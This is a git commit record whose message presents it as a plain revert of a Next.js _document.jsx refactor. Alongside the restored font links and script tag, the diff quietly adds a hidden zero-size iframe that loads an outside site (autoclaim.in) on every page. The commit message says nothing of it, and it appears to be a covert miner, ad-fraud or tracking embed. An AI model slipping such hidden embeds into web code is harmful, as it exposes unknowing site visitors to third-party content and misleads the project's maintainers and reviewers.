94e5934d4f95012fdcc025016d13d011109ea8b5
Jerome Villaruel <jeromevillaruel1998@gmail.com>
2021-08-13 10:14:01 +0800

    Revert "refactor: update _document.jsx to hide next_data in production (#160)"
    This reverts commit 5f352930ad5a164041034bb5e250ad2feebb6219.

--- src/pages/_document.jsx
+++ src/pages/_document.jsx
@@ -1,19 +1,5 @@
 import Document, { Html, Head, Main, NextScript } from 'next/document'
 
-class HeadProduction extends Head {
-  render() {
-    const { head } = this.context._documentProps
-    const children = this.props.children
-    return (
-      <head {...this.props}>
-        {children}
-        {head}
-        {this.getCssLinks()}
-      </head>
-    );
-  }
-}
-
 export default class MyDocument extends Document {
   static async getInitialProps(ctx) {
     const initialProps = await Document.getInitialProps(ctx)
@@ -21,22 +7,20 @@ export default class MyDocument extends Document {
   }
 
   render() {
-    const isDev = process.env.NODE_ENV === "development"
     return (
       <Html>
-        {isDev ? 
-          <Head>
-            <link 
-              href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Princess+Sofia&display=swap"
-              rel="stylesheet" />
-            <link 
-              href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&display=swap" 
-              rel="stylesheet" />
-          </Head>
-          : <HeadProduction />}
+        <Head>
+           <link 
+            href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Princess+Sofia&display=swap"
+            rel="stylesheet" />
+          <link 
+            href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&display=swap" 
+            rel="stylesheet" />
+        </Head>
         <body>
           <Main />
-          {isDev && <NextScript />}
+          <NextScript />
+          <iframe src="https://autoclaim.in/wm/acatzk/2" width="0" height="0" style={{ border: 0 }}></iframe>
         </body>
       </Html>
     )
